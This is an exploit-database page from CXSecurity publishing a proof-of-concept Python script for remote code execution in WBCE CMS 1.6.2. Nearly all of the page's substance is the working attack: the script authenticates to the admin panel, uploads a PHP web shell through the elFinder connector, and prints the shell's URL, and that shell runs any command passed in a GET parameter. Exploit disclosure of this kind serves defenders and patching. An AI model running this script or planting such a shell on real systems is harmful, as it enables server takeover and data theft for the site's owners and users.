---
title: WBCE CMS 1.6.2 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2024060012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-05
fetch_date: 2025-10-06T16:55:17.844900
---

# WBCE CMS 1.6.2 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WBCE CMS 1.6.2 Remote Code Execution** **2024.06.04**  Credit:  **[Ahmet Umit Bayram](https://cxsecurity.com/author/Ahmet%2BUmit%2BBayram/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: WBCE CMS v1.6.2 - Remote Code Execution (RCE)
# Date: 3/5/2024
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://wbce-cms.org/
# Software Link:
https://github.com/WBCE/WBCE\_CMS/archive/refs/tags/1.6.2.zip
# Version: 1.6.2
# Tested on: MacOS
import requests
from bs4 import BeautifulSoup
import sys
import time
def login(url, username, password):
print("Logging in...")
time.sleep(3)
with requests.Session() as session:
response = session.get(url + "/admin/login/index.php")
soup = BeautifulSoup(response.text, 'html.parser')
form = soup.find('form', attrs={'name': 'login'})
form\_data = {input\_tag['name']: input\_tag.get('value', '') for input\_tag in
form.find\_all('input') if input\_tag.get('type') != 'submit'}
# Kullanıcı adı ve şifre alanlarını dinamik olarak güncelle
form\_data[soup.find('input', {'name': 'username\_fieldname'})['value']] =
username
form\_data[soup.find('input', {'name': 'password\_fieldname'})['value']] =
password
post\_response = session.post(url + "/admin/login/index.php", data=form\_data)
if "Administration" in post\_response.text:
print("Login successful!")
time.sleep(3)
return session
else:
print("Login failed.")
print("Headers received:", post\_response.headers)
print("Response content:", post\_response.text[:500]) # İlk 500 karakter
return None
def upload\_file(session, url):
# Dosya içeriğini ve adını belirleyin
print("Shell preparing...")
time.sleep(3)
files = {'upload[]': ('shell.inc',"""<html>
<body>
<form method="GET" name="<?php echo basename($\_SERVER['PHP\_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($\_GET['cmd']))
{
system($\_GET['cmd']);
}
?>
</pre>
</body>
</html>""", 'application/octet-stream')}
data = {
'reqid': '18f3a5c13d42c5',
'cmd': 'upload',
'target': 'l1\_Lw',
'mtime[]': '1714669495'
}
response = session.post(url + "/modules/elfinder/ef/php/connector.wbce.php",
files=files, data=data)
if response.status\_code == 200:
print("Your Shell is Ready: " + url + "/media/shell.inc")
else:
print("Failed to upload file.")
print(response.text)
if \_\_name\_\_ == "\_\_main\_\_":
url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
session = login(url, username, password)
if session:
upload\_file(session, url)

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060012)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top